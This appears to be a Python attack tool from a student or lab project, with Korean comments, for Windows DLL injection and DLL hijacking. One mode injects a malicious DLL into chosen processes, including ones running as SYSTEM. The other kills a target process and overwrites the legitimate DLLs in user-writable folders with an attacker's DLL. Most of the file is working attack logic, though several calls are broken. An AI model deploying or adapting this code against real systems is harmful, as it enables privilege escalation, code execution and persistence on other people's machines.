import os
from tqdm import tqdm
from pyinjector import inject
import subprocess
import psutil
import shutil
class hiJacking():
    def hiJacking(self):
        pass
    def __init__(self):
        del_pidlist = [0, 4, 120, 540, 748, 848, 860, 908, 916, 948,
                       988, 1196, 1256, 1420, 1424, 1436, 1456, 1468, 1548, 1628,
                       1740, 1748, 1812, 1820, 1828, 1924, 2000, 2072, 2096, 2172,
                       2204, 2220, 2284, 2368, 2424, 2448, 2512, 2584, 2608, 2616,
                       2832, 3012, 3024, 3160, 3180, 3232, 3472, 3568, 3656, 3708,
                       3724, 3744, 3828, 3888, 3972, 4116, 4364, 4372, 4424, 4464,
                       4712, 4788, 5088, 5424, 5444, 5804, 5888, 6440, 8224, 8248,
                       8344, 8484, 8620, 8724, 8744, 8852, 9272, 9312, 9612, 9820,
                       10228, 10236, 10408, 11228, 11540, 11852, 13152, 13712, 14300, 15280,
                       16536, 17396]
        pid_in = input('pid 1개 입력 시 맨 앞에 \'o\', 2개 이상 입력 시 \'m\' 명령어를 입력해주세요.\n예시> 1개 -> o pid\n      2개 이상 -> m pid pid ...\n입력할 명령어:')
        pid_arr = pid_in.split(' ')
        self.pid = []
        if pid_arr[0] == 'o':
            self.pid.append(pid_arr[1])
        elif pid_arr[0] == 'm':
            for i in range(1, len(pid_arr)):
                self.pid.append(pid_arr[i])
                
                if int(self.pid[i-1]) in del_pidlist:
                    print(f'You cannot attack PID \'{self.pid[i]}\'.')
                    del self.pid[i]
        else: 
            print('\nERROR::Wrong command..')
            ans = input('Do you want to try again? yes = \'y\', No =\'q\'\ninput: ')
            if ans == 'y':
                self.__init__()
            else: 
                print("\n\n--End the program--\n")
                return 
                    
        
        print("\nAttackable PID:", * self.pid)
    
    #Listdlls.exe 파일을 이용하여 입력된 pid에서 로드하는 dll 목록을 가져옴
    def list_dll(self):
        stream = os.popen("Listdlls.exe " + str(self.pid))
        dlls = stream.read()
        program_name = ""
        try:
            program_name = dlls.split("\n")[7]
            program_name = program_name.replace("Command line: ", '').replace('"', '').replace(' -bystartup','').replace('\\','/')
            if not program_name.endswith('.exe'):
                raise Exception("not exe File")
        except:
            print("\nERROR::Wrong pid...")
            ans = input('Do you want to try again? yes = \'y\', No =\'q\'\ninput: ')
            if ans == 'y':
                self.list_dll()
            else: 
                print("\n\n--End the program--\n")
                return 
            
        
        
        if 'C:/' not in program_name:
            name_split = program_name.split('/')
            name = name_split[-1]
            for dirpath, dirname, filename in tqdm(os.walk("C:/")):
                if name in filename:
                    program_name =  os.path.join(dirpath, name)

        split_text = dlls.replace("\\","/").replace(' ', '\n').split('\n')
        list_dlls = []
        for i in split_text:
            if i.endswith(".dll"):
                list_dlls.append(i)
        return program_name, list_dlls
        
        #dll이 저장되어 있는 폴더의 일반 유저 또한 쓰기 권한이 있는지 검증
    def check_permission(self,path):
        user_perm_dir = []
        user_perm_file = []
        for i in path:
            dir_path = os.path.dirname(i)
            try:
                open(dir_path+"/test.txt","w")
                os.remove(dir_path+"/test.txt")
                name_split = i.split('/')
                name = name_split[-1]
                user_perm_file.append(name)
                user_perm_dir.append(i)
                # if os.access(dir_path,os.W_OK):
                #     name_split = i.split('/')
                #     name = name_split[-1]
                #     user_perm_file.append(name)
                #     user_perm_dir.append(i)
            except:
                pass
        return user_perm_file,user_perm_dir
    #strings 명령어를 이용하여 dll을 하드코딩으로 로드하는지 확인
    def find_string(self,name,list_name,list_dir):
        stream = os.popen("strings " + name)
        strings = stream.read()
        strings = strings.replace("\\",'/').split("\n")
        string_dll = []
        for i in strings:
            if i.endswith(".dll"):
                string_dll.append(i)
        for string in string_dll:
            if  string in list_name:
                return True
            elif string in list_dir:
                return True
            else:
                return False
    #exe파일을 직접 실행하여 pid를 가져옴
    def create_process(self,path):
            return subprocess.Popen([path]).pid
        
    #악성 dll을 입력받은 경로로 바꿔줌
    def change_dll(self,dll_path,hijactable_dll_path,pid):
        try:
            for i in hijactable_dll_path:
                os.remove(i)
                shutil.copy2(dll_path,i)
                
        except:
            print("\nERROR::Cannot remove or write DLL")
    # 사전 검사를 통해 dll Hijacking에 취약한지 확인하여 공격을 함
    # 다만 이것이 일관성(모든 경우에 해당하는) 탐지 및 공격 방법인지는 검증 필요
    def attack(self):
        path_exe = "C:/Users/codeb/Desktop/ExamDLL/CreateDLL/x64/Debug/MainDLL.exe"
        path_dll = "C:/Users/codeb/Desktop/CreateDLL.dll"
        # pid = self.create_process(path_exe)
        for i in range(0,len(self.pid)):
            print(f'{len(self.pid)}개의 pid 중 {i}번째 pid로의 hiJacking!')
            program_name, list_dlls = self.list_dll(int(self.pid[i]))
            file_list,dir_list = self.check_permission(list_dlls)
            if not len(file_list) == 0:
                if self.find_string(program_name,file_list,dir_list):
                    print("Detect programs vulnerable to dll injection")
                    print("Vulnerable PID : " + self.pid[i])
                    os.system('taskkill /f /pid '+self.pid[i])
                    self.change_dll(path_dll,dir_list,int(self.pid[i]))
                else:
                    print("Nah....")
            else:
                print("\nERROR::Not Found writable dir")
                ans = input('Do you want to try again? yes = \'y\', No =\'q\'\ninput: ')
                if ans == 'y':
                    self.in_PID()
                else: 
                    print("End the program")
                    return 
class injection():
    def injection(self):
        pass
    def in_PID(self):
        pid = input('pid 1개 입력 시 맨 앞에 \'o\', 2개 이상 입력 시 \'m\' 명령어를 입력해주세요.\n예시> 1개 -> o pid\n     2개 이상 -> m pid pid ...\n입력할 명령어:')
        pid_arr = pid.split(' ')
        if pid[0] == 'o':
            pid = pid_arr[1]
        else:
            pid = []
            for i in range(1, len(pid_arr)):
                pid.append(pid_arr[i])
                
        return pid
    #SYSTEM 권한으로 실행되는 프로세스 파싱, return 값 => pid
    def find_process(self):
        proc_lists = []
        try:
            # 실행중인 프로세스를 순차적으로 검색
            for proc in psutil.process_iter():
            # 프로세스 이름을 ps_name에 할당
                ps_name = proc.name()
                # 실행 명령어와 인자(argument)를 리스트 형식으로 가져와 cmdline에 할당
                cmdline = proc.cmdline()
                
                username = proc.username()
                if username.endswith('SYSTEM'):
                    proc_lists.append(proc.ppid())
                print('NAME:', ps_name, ' CMD:', cmdline, ' userName: ', username)
            return proc_lists
        except:
            pass
        
        
     
    #find_process에서 찾은 pid를 악성 dll을 이용하여 인젝션 해보기
    def attack(self,pid,path_dll):
        inject(pid,path_dll)

def cho_mod():
    att_mod = input('DLLInjection: \'DI\', DLLHiJacking: \'DH\'\nChoose attack mode: ')
    
    if (att_mod != 'DI') & (att_mod != 'DH'):
        print("\nERROR::Attack mode is wrong ..")
        ans = input('Do you want to try again? yes = \'y\', No =\'q\'\ninput: ')
        if ans == 'y':
             cho_mod()
        else: 
            print("\n\n--End the program--\n")
            return 'q'
    
    return att_mod
            
if __name__=='__main__': 
    mode = cho_mod()
    
    if mode == 'DI':
        dll_inject = injection()
    elif mode == 'DH':
        dll_hijact_pid = hiJacking()
    else:
        exit()
        
        
    
        
        
        
        
    # Injection
    # pid = dll_inject.in_PID()
    
    # HiJacking
    
    path_exe = "C:/Users/codeb/Desktop/ExamDLL/CreateDLL/x64/Debug/MainDLL.exe"
    path_dll = "C:/Users/codeb/Desktop/CreateDLL.dll"
    #pid = dll_hijact.create_process(path_exe)
    #inject(pid,path_dll)
    #dll_hijact.attack()